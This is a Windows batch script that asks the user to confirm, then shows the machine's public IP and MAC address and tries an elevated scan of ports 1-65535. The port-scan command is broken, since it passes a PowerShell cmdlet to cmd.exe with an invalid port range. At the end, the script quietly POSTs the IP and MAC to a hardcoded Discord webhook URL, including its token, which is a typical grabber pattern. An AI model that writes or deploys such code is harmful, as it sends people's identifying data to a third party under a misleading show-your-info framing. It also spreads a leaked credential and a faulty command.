@echo off
echo Are you sure you want to continue? (Y/N)
set /p choice=
if /i "%choice%" neq "Y" goto :eof

echo Fetching your IP Address...
for /f "delims=" %%i in ('curl ifconfig.me') do set "ip=%%i"
echo Your IP Address is: %ip%

echo Fetching your MAC Address...
for /f "tokens=2 delims= " %%a in ('getmac ^| find "-"') do set "mac=%%a"
echo Your MAC Address is: %mac%

echo Fetching open ports...
powershell Start-Process -FilePath "cmd.exe" -ArgumentList "/c Test-NetConnection %ip% -Port 1-65535 -InformationLevel Detailed | Where-Object { $_.TcpTestSucceeded -eq 'True' } | Select-Object RemotePort" -Verb RunAs

set "webhook_url=https://discord.com/api/webhooks/1182860829197090897/8A8x8aWWvVE_tO5C1VxBL7mGD895sI2hL-GAETtEy1AqcMp3iiF1MbJk4WupMQZKGY6q"
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Your IP Address is: %ip%\nYour MAC Address is: %mac%\"}" %webhook_url%
pause
